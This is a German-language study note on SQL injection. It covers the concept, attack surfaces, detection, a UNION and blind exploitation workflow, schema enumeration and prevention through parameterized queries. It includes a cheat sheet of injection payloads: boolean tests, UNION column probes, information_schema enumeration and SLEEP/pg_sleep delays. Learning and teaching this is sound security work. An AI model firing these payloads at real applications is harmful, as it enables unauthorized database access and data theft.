# SQL Injection

## Concept

SQL Injection (SQLi) entsteht, wenn Benutzereingaben unsicher in SQL-Queries eingebaut werden. <br>
Dadurch kann ein Angreifer die Struktur oder Logik der Query beeinflussen.

```python
query = f"SELECT * FROM users WHERE username = '{username}'"
```

Mögliche Auswirkungen:

- Authentifizierung umgehen
- Datenbankstruktur enumerieren
- Daten auslesen, manipulieren und löschen

### Varianten

- Classic SQLi
- UNION SQLi
- Error-based SQLi
- Blind SQLi

## Attack Surface

SQLi ist überall möglich, wo User Input in SQL-Statements gelangt:

- GET-/POST-Parameter
- JSON/XML
- Cookies
- HTTP-Header
- URL-Pfade
- Login-, Such- und Filterfunktionen
- Sortierparameter

Besonders relevant sind SQL-Kontexte wie **INSERT**, **UPDATE**, **WHERE** und **ORDER BY**.

## Detection

Ziel ist festzustellen, ob der Input die SQL-Query beeinflusst.

### Syntax-Test

```python
payload = "'"
```

Mögliche Hinweise auf SQLi:

- SQL-Fehler
- HTTP 500
- veränderte Responses
- unerwartete Ergebnisse

### Boolean-Test

```python
true_payload = "' AND 1=1 --"
false_payload = "' AND 1=2 --"
```

Unterschiedliche Responses können auf SQLi hinweisen.

### Blind SQLi

Wenn keine Daten oder Fehlermeldungen direkt sichtbar sind, können folgende Signale verwendet werden:

- Conditional Responses
- Conditional Errors
- Time Delays
- Out-of-band Interactions

## Exploitation

### Typischer Ablauf

1. Detection
2. SQL-Kontext bestimmen
3. DBMS identifizieren
4. SQLi-Technik wählen
5. Enumeration
6. Daten auslesen

### UNION SQLi

Zuerst die Anzahl der Spalten bestimmen:

```python
payloads = [
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL --",
]
```

Anschließend geeignete Datentypen und ausgabefähige Spalten bestimmen.

### Blind SQLi

Condition TRUE → Response A <br>
Condition FALSE → Response B

Alternativ können Fehler oder Antwortzeiten als Signal verwendet werden.

## Enumeration

### Reihenfolge

1. DBMS
2. Schema
3. Tables
4. Columns
5. Data

### DBMS-Version

```python
payloads = [
    "' UNION SELECT @@version --",       # MySQL
    "' UNION SELECT version() --",       # PostgreSQL
]
```

### Tabellen

```python
payload = "' UNION SELECT table_name FROM information_schema.tables --"
```

### Spalten

```python
payload = "' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --"
```

## Payloads / Cheat Sheet

### Boolean

```python
payloads = [
    "' AND 1=1 --",
    "' AND 1=2 --",
]
```

### UNION

```python
payloads = [
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
]
```

### Time-based

```python
payloads = [
    "' AND SLEEP(10) --",         # MySQL
    "' AND pg_sleep(10) --",      # PostgreSQL
]
```

Payloads müssen an DBMS, SQL-Kontext, Spaltenanzahl und Datentypen angepasst werden.

## Prevention

### Parameterized Queries

**Unsicher:**

```python
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
```

**Sicher:**

```python
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
```

User Input wird dadurch als Datenwert und nicht als SQL-Syntax behandelt.

### Weitere Maßnahmen

- Keine Aneinanderkettung von Strings für SQL-Queries
- Allowlisting bei dynamischen SQL-Strukturelementen
- Least Privilege für Datenbank-Accounts
- Keine detaillierten SQL-Fehler an Clients zurückgeben
- Input Validation als zusätzliche Schutzmaßnahme
